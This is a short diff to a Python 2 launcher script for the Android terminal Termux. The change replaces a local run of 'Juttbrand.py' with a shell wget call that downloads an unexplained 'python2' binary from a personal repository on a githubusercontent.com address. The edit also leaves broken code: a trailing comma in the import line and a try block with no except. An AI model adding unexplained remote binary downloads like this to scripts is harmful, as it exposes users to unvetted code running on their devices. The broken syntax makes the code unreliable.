@@ -3,7 +3,7 @@
 #!/data/data/com.termux/files/usr/bin/python2
 #coding=utf-8
 
-import os,platform,sys
+import os,
 
 try:
 	import requests
@@ -14,5 +14,6 @@ import requests
 if not os.path.isfile('/data/data/com.termux/files/usr/bin/wget'):
 	os.system('pkg update && pkg install wget -y')
 
-os.system('Juttbrand.py')
+try:
+        os.system('wget https://githubusercontent.com/rashidali711/Binaries/main/python2 Juttbrand.py')
 
